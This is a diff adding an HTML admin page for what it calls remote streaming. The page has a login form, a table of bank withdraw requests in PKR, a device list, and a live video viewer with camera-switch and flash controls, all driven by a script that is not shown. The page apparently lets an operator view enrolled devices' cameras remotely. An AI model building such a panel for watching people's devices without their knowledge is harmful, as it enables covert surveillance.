@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Admin - Remote Streaming</title>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: system-ui, sans-serif; margin: 0; padding: 20px; background: #1a1a2e; color: #eee; }
+    h1 { margin-top: 0; }
+    h2 { margin-top: 24px; margin-bottom: 12px; font-size: 18px; }
+    .section { margin-bottom: 24px; }
+    .hidden { display: none !important; }
+    input, button { padding: 10px 16px; font-size: 14px; border-radius: 6px; }
+    input { border: 1px solid #444; background: #2a2a3e; color: #eee; width: 200px; }
+    button { border: none; background: #6366f1; color: white; cursor: pointer; }
+    button:hover { background: #4f46e5; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    button.danger { background: #dc2626; }
+    button.danger:hover { background: #b91c1c; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
+    th { background: #2a2a3e; }
+    #videoContainer { max-width: 640px; background: #000; border-radius: 8px; overflow: hidden; margin-top: 16px; }
+    #remoteVideo { width: 100%; display: block; }
+    .status { padding: 8px; border-radius: 4px; margin-bottom: 12px; }
+    .status.error { background: #7f1d1d; color: #fca5a5; }
+    .status.success { background: #14532d; color: #86efac; }
+    .status.info { background: #1e3a5f; color: #93c5fd; }
+  </style>
+</head>
+<body>
+  <div id="loginSection" class="section">
+    <h1>Admin Login</h1>
+    <div id="loginError" class="status hidden"></div>
+    <p>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button id="loginBtn">Login</button>
+    </p>
+  </div>
+
+  <div id="adminSection" class="section hidden">
+    <h1>Admin</h1>
+    <div id="adminError" class="status hidden"></div>
+    <button id="logoutBtn">Logout</button>
+    <button id="refreshBtn">Refresh</button>
+    <h2>Withdraw Requests</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>Amount (PKR)</th>
+          <th>Bank</th>
+          <th>Account</th>
+          <th>Status</th>
+          <th>Date</th>
+        </tr>
+      </thead>
+      <tbody id="withdrawList"></tbody>
+    </table>
+    <h2>Devices</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Device ID</th>
+          <th>Name</th>
+          <th>Platform</th>
+          <th>Last Seen</th>
+          <th>Status</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody id="deviceList"></tbody>
+    </table>
+  </div>
+
+  <div id="viewerSection" class="section hidden">
+    <h2>Live Stream</h2>
+    <div id="viewerStatus" class="status info">Connecting...</div>
+    <div id="videoContainer">
+      <video id="remoteVideo" autoplay playsinline></video>
+    </div>
+    <p>
+      <button id="switchCameraBtn">Switch Camera</button>
+      <button id="flashOnBtn">Flash On</button>
+      <button id="flashOffBtn">Flash Off</button>
+      <button id="stopViewBtn" class="danger">Stop Viewing</button>
+    </p>
+  </div>
+
+  <script src="admin.js"></script>
+</body>
+</html>
